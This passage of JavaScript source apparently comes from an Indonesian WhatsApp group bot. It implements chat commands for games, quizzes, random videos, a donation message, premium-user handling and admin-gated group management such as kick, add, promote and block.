Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await Cepti.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Cepti.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
confirmlimit(sender, 1)
break
case 'delttc': case 'delttt': { 
  
    if (isBan) return reply(mess.banned)
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
Cepti.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
reply('rusak')
}
}
break
case 'suitpvp': case 'suit': {
  
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${sender.split("@")[0]}`)
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply( `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await Cepti.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) Cepti.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
confirmlimit(sender, 1)
break
case 'asupan':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var asupan = JSON.parse(fs.readFileSync('./tempat/asupan.json'))
var hasil = pickRandom(asupan)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupanghea':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var gheayubi = JSON.parse(fs.readFileSync('./tempat/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupanbocil':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var bocil = JSON.parse(fs.readFileSync('./tempat/bocil.json'))
var hasil = pickRandom(bocil)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupanukhty':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ukhty = JSON.parse(fs.readFileSync('./tempat/ukhty.json'))
var hasil = pickRandom(ukhty)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupansantuy':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var santuy = JSON.parse(fs.readFileSync('./tempat/santuy.json'))
var hasil = pickRandom(santuy)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupankayes':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var kayes = JSON.parse(fs.readFileSync('./tempat/kayes.json'))
var hasil = pickRandom(kayes)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupanrika':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var rikagusriani = JSON.parse(fs.readFileSync('./tempat/rikagusriani.json'))
var hasil = pickRandom(rikagusriani)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupannotnot':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./tempat/asupannotnot.json'))
var hasil = pickRandom(notnot)
Cepti.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'donasi': case 'donasi': case 'cekupdate': case 'updatebot': case 'cekbot': {
teks = `┏━ꕥ〔 *Donasi • Dana* 〕ꕥ━⬣
┃⫹⫺ Gopay = 088293100977
┃⫹⫺ Pulsa Xl = 088293100977
┗━━━━ꕥ
┏━━ꕥ〔 *NOTE* 〕ꕥ━⬣
┃Wa.me/+6288293100977
┃Donasi agar bot makin bagus
┃Dan menghilangkan bug lain nya
┗━━━━ꕥ`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: '⋮☰ 𝗢𝗪𝗡𝗘𝗥'}, type: 1}, {buttonId: `sewa`, buttonText: {displayText: '⋮☰ 𝗦𝗘𝗪𝗔'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e41eda718fa6788c932c0.png`},
jpegThumbnail: thumb,
caption: teks,
footer: Ceptiyt,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"Mau Donasi? Ketik Owner",
body: "Click to donasi", 
thumbnail: fs.readFileSync("theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://youtube.com/@Cepti_gans',
sourceUrl: "https://youtube.com/@Cepti_gans"
}}
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break
case 'premium2':
if (!isOwner) return reply(mess.owner)
if (args[0] === 'add') {
if (m.message.extendedTextMessage != undefined) {
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid

premium.addPremiumUser(mentioned[0], args[2], _premium)
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)

} else {

premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
}
} else if (args[0] === 'del') {
if (m.message.extendedTextMessage != undefined) {
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
reply(mess.success)
} else {
_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
reply(mess.success)
}
} else {
reply(mess.wrongFormat)
}
break
case 'chat': {
if (!isOwner) return reply(mess.owner)
if (!q) return reply( 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
if (args[0] === 'mute') {
    Cepti.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
    Cepti.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'archive') {
    Cepti.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
    Cepti.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'read') {
    Cepti.chatModify({ fromMe: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'unread') {
    Cepti.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'delete') {
    Cepti.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}
break
case 'family100': {
  
    if (isBan) return reply(mess.banned)
 if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if ('family100'+m.chat in _family100) {
    reply('Masih Ada Sesi Yang Belum Diselesaikan!')
    throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
    id: 'family100'+m.chat,
    pesan: await Cepti.sendText(m.chat, hasil, m),
    ...random,
    terjawab: Array.from(random.jawaban, () => false),
    hadiah: 6,
}
}
confirmlimit(sender, 1)
break
    case 'fakemore':

    if (isBan) return reply(mess.banned)
    if (args.length < 1) return reply(`Penggunaan ${prefix + command} mem|beri`)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
reply(`${teks1}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${teks2}`)
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
  
    if (isBan) return reply(mess.banned)
if (!m.quoted && !text) return reply( `Kirim/reply text dengan caption ${prefix + command}`)
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
case 'toletter': {
   
    if (isBan) return reply(mess.banned)
if (!Number(args[0])) return reply(`Example:\n${prefix}toletter 956`)
try {
quere = args.join(" ")
convertes = await toHur(quere)
reply(`*[ALPHABET TEXT]*\n•Nomor :*${quere}*\n•Alphabet :*${convertes}*`)
} catch {
replay(`Error!`)
}
}
break
case 'fliptext':

    if (isBan) return reply(mess.banned)
if (args.length < 1) return reply(`Example:\n${prefix}fliptext Hallo`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`*[FLIP TEXT]*\n•Normal :*${quere}*\n•Flip :*${flipe}*`)
break
case 'tebak': {
  
    if (isBan) return reply(mess.banned)
 if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`)
if (args[0] === "lagu") {
    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
    let result = anu[Math.floor(Math.random() * anu.length)]
    let msg = await Cepti.sendMessage(m.chat, {audio: { url: result.link_song }, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
    Cepti.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
    })
    await sleep(60000)
    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${setting.botName} bot`, m)
    delete tebaklagu[m.sender.split('@')[0]]
    }
} else if (args[0] === 'gambar') {
    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
    let result = anu[Math.floor(Math.random() * anu.length)]
    Cepti.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
    })
    await sleep(60000)
    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${setting.botName} bot`, m)
    delete tebakgambar[m.sender.split('@')[0]]
    }
} else if (args[0] === 'kata') {
    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
    let result = anu[Math.floor(Math.random() * anu.length)]
    Cepti.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
    })
    await sleep(60000)
    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${setting.botName} bot`, m)
    delete tebakkata[m.sender.split('@')[0]]
    }
} else if (args[0] === 'kalimat') {
    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
    let result = anu[Math.floor(Math.random() * anu.length)]
    Cepti.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
    })
    await sleep(60000)
    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${setting.botName} bot`, m)
    delete tebakkalimat[m.sender.split('@')[0]]
    }
} else if (args[0] === 'lirik') {
    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
    let result = anu[Math.floor(Math.random() * anu.length)]
    Cepti.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
    })
    await sleep(60000)
    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${setting.botName} bot`, m)
    delete tebaklirik[m.sender.split('@')[0]]
    }
} else if (args[0] === 'lontong') {
    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
    let result = anu[Math.floor(Math.random() * anu.length)]
    Cepti.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
    })
    await sleep(60000)
    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ` © ${setting.botName} bot`, m)
    delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
    }
}
}
confirmlimit(sender, 1)
break
case 'kuismath': case 'math': {
  
    if (isBan) return reply(mess.banned)
  if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply( "Masih Ada Sesi Yang Belum Diselesaikan!")
let { genMath, modes } = require('./src/math')
if (!text) return reply( `Pilih Mode:\n- ${Object.keys(modes).join(' \n- ')}\n\nContoh penggunaan: ${prefix}math medium`)
let result = await genMath(text.toLowerCase())
Cepti.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
    kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
    delete kuismath[m.sender.split('@')[0]]
}
}
confirmlimit(sender, 1)
break
case 'jodohku': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}\nINI CUMA GAME OK`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, jawab, ` © ${setting.botName} bot`, m, {mentions: ments})
}
break
case '͏͏jodohku͏͏': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = '6285246027002@s.whatsapp.net'
let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}\nINI CUMA GAME OK`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, jawab, ` © ${setting.botName} bot`, m, {mentions: ments})
}
break
case 'jadian': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply(mess.group)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, jawab, ` © ${setting.botName} bot`, m, {mentions: menst})
}
break
case 'join': {
if (!isOwner) return reply(mess.owner)
if (!text) return reply( 'Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply( 'Link Invalid!')
reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Cepti.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'leave': {
if (!isOwner) return reply(mess.owner)
await Cepti.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
	case 'kick': {
	  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Cepti.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case 'add': {
	  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Cepti.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case 'promote': {
	  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Cepti.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case 'demote': {
	  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Cepti.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
case 'block': {
if (!isOwner) return reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Cepti.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
case 'unblock': {
if (!isOwner) return reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Cepti.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
case 'setname': case 'setsubject': {
  
    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
if (!text) return reply( 'Text ?')
await Cepti.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
  case 'setdesc': case 'setdesk': {

    if (isBan) return reply(mess.banned)
if (!m.isGroup) return reply( mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins) return reply( mess.admin)
if (!text) return reply( 'Text ?')
